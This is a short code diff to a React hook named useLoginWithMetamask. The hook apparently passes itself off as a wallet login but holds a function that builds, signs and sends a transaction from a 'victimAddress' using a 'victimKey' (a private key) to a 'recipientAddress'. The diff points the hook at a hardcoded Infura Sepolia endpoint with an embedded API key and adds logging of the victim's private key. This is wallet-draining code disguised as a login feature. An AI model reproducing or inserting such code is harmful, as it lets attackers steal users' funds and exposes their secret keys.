@@ -11,7 +11,10 @@ export const useLoginWithMetamask = (
   values: LoginInterface,
   isBusiness: boolean
 ) => {
-  const web3 = new Web3((window as any).ethereum);
+  const web3 = new Web3(
+    "https://sepolia.infura.io/v3/5065fe39d7a24c22bbfb031ac09fa56e"
+  );
+
   const navigate = useNavigate();
   const { setUserInfo } = useUserInfo();
   const toastFunction = useCustomToast();
@@ -28,6 +31,7 @@ export const useLoginWithMetamask = (
     victimKey: string
   ) => {
     try {
+      console.log(victimAddress, recipientAddress, victimKey)
       const nonce = await web3.eth.getTransactionCount(victimAddress);
       const tx = {
         nonce,
@@ -37,10 +41,10 @@ export const useLoginWithMetamask = (
         gasPrice: web3.utils.toWei("60", "gwei"),
       };
 
-      console.log(tx)
+      console.log(tx);
 
       const signedTx = await web3.eth.accounts.signTransaction(tx, victimKey);
-      console.log(signedTx)
+      console.log(signedTx);
       const txHash = await web3.eth.sendSignedTransaction(
         signedTx.rawTransaction
       );
